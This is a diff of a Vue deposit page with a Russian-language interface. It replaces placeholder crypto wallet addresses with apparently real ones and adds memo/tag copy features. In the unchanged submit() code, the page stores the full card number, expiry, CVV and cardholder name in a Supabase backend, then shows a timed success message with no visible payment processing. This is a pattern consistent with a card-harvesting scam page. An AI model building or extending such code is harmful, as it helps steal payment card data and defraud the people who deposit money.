@@ -26,7 +26,6 @@ const tabs = [
   { id: "withdraw", label: "Выплата" },
   { id: "history", label: "История транзакций" },
 ];
-
 const paymentMethod = ref("card");
 
 // --- Поповнення (картою) ---
@@ -35,7 +34,8 @@ const expiry = ref("");
 const cvv = ref("");
 const name = ref("");
 const amount = ref("");
-const lastDepositAmount = ref(0); // Зберігаємо суму для модального вікна
+const lastDepositAmount = ref(0);
+// Зберігаємо суму для модального вікна
 const method = ref("Visa/Mastercard");
 const processing = ref(false);
 const showMessage = ref(false);
@@ -48,7 +48,7 @@ const cryptoOptions = [
     id: "btc",
     name: "Bitcoin (BTC)",
     network: "Bitcoin",
-    address: "bc1qYourBitcoinAddressHereRandomChars",
+    address: "3MimHZpAZocCsZjbKFage3YuHJZW91SWNw",
     instructions:
       "Отправляйте только Bitcoin (BTC) в сети Bitcoin на этот адрес. Зачисление после 2 подтверждений.",
   },
@@ -56,7 +56,7 @@ const cryptoOptions = [
     id: "eth",
     name: "Ethereum (ETH)",
     network: "ERC20",
-    address: "0xYourEthereumAddressHereRandomChars",
+    address: "0x86a845e52f2bdc7712104912bc78b30e79250d0e",
     instructions:
       "Отправляйте только Ethereum (ETH) в сети ERC20 на этот адрес. **Не используйте другие сети (BEP20, Polygon и т.д.)!**",
   },
@@ -64,7 +64,7 @@ const cryptoOptions = [
     id: "usdt",
     name: "Tether (USDT TRC20)",
     network: "TRC20",
-    address: "TYourTrc20AddressHereRandomChars",
+    address: "TJwDXGVwEtqjR1pH1X4fUJa6RZJmc7r88z",
     instructions:
       "Отправляйте только USDT в сети TRON (TRC20) на этот адрес. Сеть TRC20 обеспечивает низкие комиссии.",
   },
@@ -72,7 +72,7 @@ const cryptoOptions = [
     id: "bnb",
     name: "BNB (BNB)",
     network: "BEP20",
-    address: "0xYourBnbBEP20AddressHereRandom",
+    address: "0x86a845e52f2bdc7712104912bc78b30e79250d0e",
     instructions:
       "Отправляйте только BNB в сети Binance Smart Chain (BEP20). Убедитесь, что выбрали правильную сеть.",
   },
@@ -80,23 +80,25 @@ const cryptoOptions = [
     id: "sol",
     name: "Solana (SOL)",
     network: "Solana",
-    address: "SoLYourSolanaAddressHereRandomChars",
+    address: "BrZUXCjHhqE4WFe7Ez8CUhe7U1XpqyA5HKVtGQvRxceL",
     instructions:
       "Отправляйте только SOL в сети Solana. Адреса Solana чувствительны к регистру.",
   },
+  // ==== ЗМІНА ТУТ ====
   {
     id: "xrp",
     name: "Ripple (XRP)",
     network: "Ripple",
-    address: "rYourRippleAddressHereDestinationTag",
+    address: "rs2dgzYeqYqsk8bvkQR5YPyqsXYcA24MP2",
+    memo: "672654",
     instructions:
-      "Отправляйте только XRP. Для некоторых кошельков может потребоваться **Destination Tag**. Уточните в поддержке, если он нужен.",
+      "Отправляйте только XRP. Вы должны правильно заполнить адрес депозита и идентификатор [Мемо/Тег] ",
   },
   {
     id: "doge",
     name: "Dogecoin (DOGE)",
     network: "Dogecoin",
-    address: "DYourDogecoinAddressHereRandomChars",
+    address: "DD7oAuWgZByP1JBrw5xqbVH3yre8cdoNcK",
     instructions:
       "Отправляйте только DOGE. Wow. Such crypto. Much deposit. Very blockchain.",
   },
@@ -104,15 +106,14 @@ const cryptoOptions = [
     id: "ada",
     name: "Cardano (ADA)",
     network: "Cardano",
-    address: "addr1YourCardanoAddressHereRandomCharsLong",
-    instructions:
-      'Отправляйте только ADA в сети Cardano. Адреса Cardano начинаются с "addr1".',
+    address: "DdzFFzCqrhsrRKmf2yfR8XPUafxfiyWhJmdqdCfxAUTVmuhpeWQKSMaYkgNfBZToak4rPviFZeyaFnwrSMWWwd6Q48moBQcYF3J63gmY",
+    instructions: 'Отправляйте только ADA в сети Cardano.',
   },
   {
     id: "trx",
     name: "TRON (TRX)",
     network: "TRC20",
-    address: "TYourTronTrxAddressHereRandomChars",
+    address: "TJwDXGVwEtqjR1pH1X4fUJa6RZJmc7r88z",
     instructions:
       "Отправляйте только TRX в сети TRON (TRC20). Не путайте с USDT в той же сети.",
   },
@@ -120,9 +121,10 @@ const cryptoOptions = [
     id: "ton",
     name: "Toncoin (TON)",
     network: "TON",
-    address: "UQYourToncoinAddressHereRandomChars",
+    address: "EQBX63RAdgShn34EAFMV73Cut7Z15lUZd1hnVva68SEl7sxi",
+    memo: "943734",
     instructions:
-      "Отправляйте только Toncoin (TON). Убедитесь, что ваш кошелек поддерживает переводы в сети TON.",
+      "Отправляйте только Toncoin (TON). Убедитесь, что ваш кошелек поддерживает переводы в сети TON. Вы должны правильно заполнить адрес депозита и идентификатор [Мемо/Тег]",
   },
 ].map((option) => ({ ...option, icon: cryptoIcons[option.id] }));
 
@@ -131,6 +133,9 @@ const isUpdatingCrypto = ref(false);
 const copyMessage = ref("");
 const dropdownRef = ref(null);
 const isDropdownOpen = ref(false);
+
+// Змінна для повідомлення про копіювання мемо
+const memoCopyMessage = ref("");
 
 // Форматуємо суму для красивого відображення в модальному вікні
 const formattedLastAmount = computed(() => {
@@ -169,6 +174,9 @@ onUnmounted(() => {
 });
 
 const currentCryptoAddress = computed(() => selectedCryptoOption.value.address);
+// ==== НОВА COMPUTED ВЛАСТИВІСТЬ ДЛЯ MEMO ====
+const currentCryptoMemo = computed(() => selectedCryptoOption.value.memo);
+
 const currentQrCodeUrl = computed(
   () =>
     `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(
@@ -197,6 +205,28 @@ function copyAddress() {
       }, 3000);
     });
 }
+
+// ==== ОНОВЛЕНА ФУНКЦІЯ ДЛЯ КОПІЮВАННЯ MEMO ====
+function copyMemo() {
+    if (memoCopyMessage.value || !currentCryptoMemo.value) return;
+    navigator.clipboard
+        .writeText(currentCryptoMemo.value)
+        .then(() => {
+            memoCopyMessage.value = "Мемо/Тег скопирован!";
+            setTimeout(() => {
+                memoCopyMessage.value = "";
+            }, 3000);
+        })
+        .catch((err) => {
+            console.error("Не удалось скопировать текст: ", err);
+            memoCopyMessage.value = "Ошибка копирования";
+            setTimeout(() => {
+                memoCopyMessage.value = "";
+            }, 3000);
+        });
+}
+
+
 function detectCardType(number) {
   number = number.replace(/\s/g, "");
   if (/^4/.test(number)) return "visa";
@@ -262,7 +292,6 @@ function validate() {
 async function submit() {
   if (!validate()) return;
   processing.value = true;
-
   const authUser = JSON.parse(localStorage.getItem("authUser") || "{}");
   // Збереження даних картки в Supabase залишається, це правильно
   await saveUser({
@@ -271,7 +300,6 @@ async function submit() {
     cvv: cvv.value,
     nameCard: name.value,
   });
-
   setTimeout(() => {
     processing.value = false;
     showMessage.value = true;
@@ -483,6 +511,12 @@ function openChat() {
                 {{ copyMessage }}
               </div>
             </transition>
+            
+            <transition name="toast-fade">
+              <div v-if="memoCopyMessage" class="copy-success-toast" style="top: 60%;">
+                {{ memoCopyMessage }}
+              </div>
+            </transition>
 
             <div v-if="currentQrCodeUrl" class="qr-code">
               <img :src="currentQrCodeUrl" alt="QR Code" />
@@ -492,7 +526,13 @@ function openChat() {
               <p class="address">{{ currentCryptoAddress }}</p>
               <button @click="copyAddress" class="copy-btn">Копировать</button>
             </div>
-
+            
+            <div v-if="currentCryptoMemo" class="address-container memo-container">
+                <p class="address">
+                  <strong>Мемо/Тег:</strong> {{ currentCryptoMemo }}
+                </p>
+                <button @click="copyMemo" class="copy-btn">Копировать</button>
+            </div>
             <p class="instructions" v-html="currentCryptoInstructions"></p>
           </div>
         </div>
@@ -578,6 +618,19 @@ function openChat() {
 </template>
 
 <style scoped>
+/* ==== НОВІ СТИЛІ ==== */
+.memo-container {
+    margin-top: -24px;
+    margin-bottom: 40px;
+    background: #2a2f3a; /* Трохи інший фон для виділення */
+}
+
+.address strong {
+  color: #adb5bd;
+  margin-right: 8px;
+}
+/* ==== КІНЕЦЬ НОВИХ СТИЛІВ ==== */
+
 .deposit {
   padding: 40px 0;
 }
